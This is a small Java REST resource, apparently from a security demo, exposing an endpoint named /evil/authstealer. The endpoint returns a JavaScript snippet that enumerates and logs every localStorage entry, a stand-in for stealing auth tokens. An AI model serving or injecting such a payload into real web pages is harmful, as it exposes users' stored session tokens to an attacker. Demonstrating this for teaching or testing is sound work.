package de.msg.rest;

import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.core.MediaType;

@Path("/evil")
public class MalloryREST {

	@GET
	@Path("/authstealer")
	@Produces(value = MediaType.TEXT_HTML)
	public String test() {
		System.out.println("Mallory was here");
		return "for (var key in localStorage) {\n" + 
				"  console.log(key + ':' + localStorage[key]);\n" + 
				"}"
				;
	}
}
